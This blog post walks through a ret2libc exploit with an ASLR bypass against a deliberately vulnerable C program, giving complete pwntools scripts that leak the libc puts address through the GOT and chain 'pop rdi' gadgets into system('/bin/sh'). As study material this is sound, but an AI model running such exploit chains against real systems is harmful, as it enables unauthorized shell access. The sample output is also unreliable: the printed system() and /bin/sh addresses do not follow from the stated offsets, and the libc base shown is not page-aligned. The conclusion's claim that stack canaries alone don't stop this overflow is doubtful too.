---
layout: post
title: "ret2libc Attack with ASLR Bypass"
date: 2026-02-13
category: "Exploit Development"
tags: [ret2libc, aslr, rop, pwntools, linux, binary-exploitation]
read_time: 12
excerpt: "Return-to-Library (ret2libc) attack with ASLR bypass using GOT leak and pwntools. A practical walkthrough from vulnerable binary to shell."
---

## Introduction

In the ever-evolving landscape of cybersecurity, understanding both offensive and defensive techniques is crucial. This article explores the **return-to-library (ret2libc)** exploit, specifically focusing on bypassing Address Space Layout Randomization (ASLR) — one of the most common modern mitigations.

ASLR randomizes memory addresses at runtime, making it significantly harder to predict and target specific memory locations. However, skilled attackers can circumvent ASLR using information leaks. We'll walk through the technique from start to shell.

## Background

### What is ret2libc?

Return-to-libc is a technique where the attacker redirects execution to an existing library function (typically `system()` from libc) rather than injecting shellcode. Since we're calling already-loaded code, we bypass non-executable stack protections (NX/DEP).

The classic goal: call `system("/bin/sh")` to spawn a shell.

### What is ASLR?

ASLR randomizes the base addresses of:
- The stack
- The heap
- Shared libraries (including libc)

Because libc's base address changes on every execution, we can't hardcode offsets. We need a **leak** first.

### The GOT/PLT Leak Technique

The **Global Offset Table (GOT)** stores resolved addresses of dynamically linked functions. Once a function like `puts()` is called once, its real address is stored in the GOT. 

Since the binary itself doesn't have ASLR (compiled with `-no-pie`), the GOT address is fixed. We can:
1. Call `puts(got['puts'])` to print the real libc address of `puts`
2. Compute libc base = leaked `puts` address − known offset of `puts` in libc
3. Compute `system()` and `/bin/sh` addresses relative to libc base
4. Call `system("/bin/sh")` for a shell

## Walkthrough

### Vulnerable Binary

```c
#include <stdio.h>

int main() {
    char n[10];
    puts("Enter data ");
    gets(n);       // unsafe — no bounds checking
    return 0;
}
```

Compile with stack protection and PIE disabled:

```bash
gcc main.c -o vuln -fno-stack-protector -no-pie
```

Check protections:

```bash
$ checksec vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX is enabled (no shellcode on stack), but no PIE — perfect for ret2libc.

### Finding the Overflow Offset

Use a cyclic pattern to find how many bytes until we control RIP:

```python
from pwn import *
io = process('./vuln')
io.sendline(cyclic(100))
io.wait()
# read core dump or use gdb to find offset
```

In this case, the buffer is 10 bytes + 8 bytes saved RBP = **18 bytes** to reach the return address.

### Finding the ROP Gadget

We need a `pop rdi ; ret` gadget to pass the argument to `puts` and later `system`:

```bash
$ ROPgadget --binary vuln | grep "pop rdi"
0x00000000004011bb : pop rdi ; ret
```

### Stage 1 — Leak libc Address

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
context.log_level = 'error'

# ROP gadget: pop rdi ; ret
pop_rdi = pack(0x00000000004011bb)

# Stage 1 payload: call puts(got['puts']), then puts(got['gets']), then back to main
payload  = cyclic(18)
payload += pop_rdi + pack(elf.got.puts)  + pack(elf.plt.puts)
payload += pop_rdi + pack(elf.got.gets)  + pack(elf.plt.puts)
payload += pack(elf.sym.main)            # loop back to main for stage 2

io = process('./vuln')
io.recvuntil(b"data")
io.recv()
io.sendline(payload)

# Parse leaked addresses
leaked = io.recv().split(b"\n")
puts_addr = unpack(leaked[0].ljust(8, b'\x00'), 'all')
gets_addr = unpack(leaked[1].ljust(8, b'\x00'), 'all')

print(f"[+] puts @ {hex(puts_addr)}")
print(f"[+] gets @ {hex(gets_addr)}")
```

### Stage 2 — Compute and Exploit

```python
# Known offsets from libc (find with: readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts)
PUTS_OFFSET   = 0x0000000000072230
SYSTEM_OFFSET = 0x0000000000045e50
BINSH_OFFSET  = 0x0000000000195152

libc_base  = puts_addr - PUTS_OFFSET
system_addr = libc_base + SYSTEM_OFFSET
bin_sh      = libc_base + BINSH_OFFSET

print(f"[+] libc base  @ {hex(libc_base)}")
print(f"[+] system()   @ {hex(system_addr)}")
print(f"[+] /bin/sh    @ {hex(bin_sh)}")

# Stage 2 payload: system("/bin/sh")
payload2  = cyclic(18)
payload2 += pop_rdi + pack(bin_sh) + pack(system_addr)

io.recvuntil(b"data")
io.recv()
io.sendline(payload2)
io.interactive()
```

## Result

Running the full exploit:

```
[+] puts @ 0x7f8b2c4e7270
[+] gets @ 0x7f8b2c47f3d0
[+] libc base  @ 0x7f8b2c475040
[+] system()   @ 0x7f8b2c4ba090
[+] /bin/sh    @ 0x7f8b2c66a192
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ whoami
user
```

## Conclusion

The ret2libc + GOT leak technique remains one of the fundamental building blocks of exploit development. Key takeaways:

- **GOT stores resolved libc addresses** — leak one, get all offsets relative to base
- **`pop rdi ; ret` gadget** is essential for passing arguments on x86-64
- **Offset calculation** is deterministic once you have the leak — ASLR defeated
- Mitigations like **Full RELRO** and **stack canaries** add complexity but don't prevent this technique alone

Always apply these skills ethically and only on systems you are authorized to test.

## See Also

- [pwntools documentation](https://docs.pwntools.com/)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [Pwnable.kr](https://pwnable.kr/) — practice environment
